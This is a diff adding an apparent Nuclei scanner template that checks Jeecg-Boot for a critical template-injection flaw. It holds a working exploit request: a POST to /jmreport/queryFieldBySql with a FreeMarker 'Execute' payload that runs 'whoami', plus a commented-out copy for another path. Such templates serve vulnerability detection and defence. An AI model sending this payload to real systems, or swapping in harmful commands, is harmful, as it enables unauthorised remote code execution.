@@ -1,0 +1,50 @@
+id: jeecg-boot-ssti-rce
+
+info:
+  name: Jeecg-Boot SSTI 远程命令执行
+  author: jeecg-boot
+  severity: critical
+  tags: jeecg
+
+http:
+  # - raw:
+  #     - |+
+  #       POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
+  #       Host: {{Hostname}}
+  #       User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+  #       Accept-Encoding: gzip, deflate
+  #       Accept: */*
+  #       Connection: close
+  #       Content-Type: application/json
+  #       Content-Length: 98
+
+  #       {"sql":"select '<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"whoami\") }' "}
+
+  #   matchers:
+  #     - type: dsl
+  #       dsl:
+  #         - 'status_code == 200'
+  #         - 'contains(body, "\"success\":true")'
+  #         - '!contains(body, "whoami")'  # 新增条件：body 不包含 "whoami"
+  #       condition: and
+
+  - raw:
+      - |+
+        POST /jmreport/queryFieldBySql HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+        Content-Type: application/json
+        Content-Length: 98
+
+        {"sql":"select '<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"whoami\") }' "}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "\"success\":true")'
+          - '!contains(body, "whoami")'  # 新增条件：body 不包含 "whoami"
+        condition: and
